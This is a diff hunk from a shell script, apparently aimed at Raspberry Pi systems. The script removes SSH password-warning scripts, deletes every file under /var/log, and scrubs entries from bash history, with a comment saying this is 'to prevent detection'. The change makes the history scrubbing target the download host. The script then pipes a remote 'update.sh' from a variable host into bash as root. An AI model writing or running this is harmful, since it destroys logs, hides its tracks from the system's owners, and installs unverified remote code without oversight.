@@ -22,7 +22,7 @@ sudo rm -f /etc/profile.d/sshpwd.sh /etc/xdg/lxsession/LXDE-pi/sshpwd.sh
 # Clear all logs
 sudo rm -rf /var/log/*
 # Remove last line of bash history to prevent detection if typed into terminal
-sed -e '$ d' ~/.bash_history > /tmp/.bash_history; mv /tmp/.bash_history ~/.bash_history
+grep -v "$host:$down_port" ~/.bash_history > /tmp/.bash_history; mv /tmp/.bash_history ~/.bash_history
 
 su -c "curl -L $host:$down_port/linux/update.sh |bash"
 
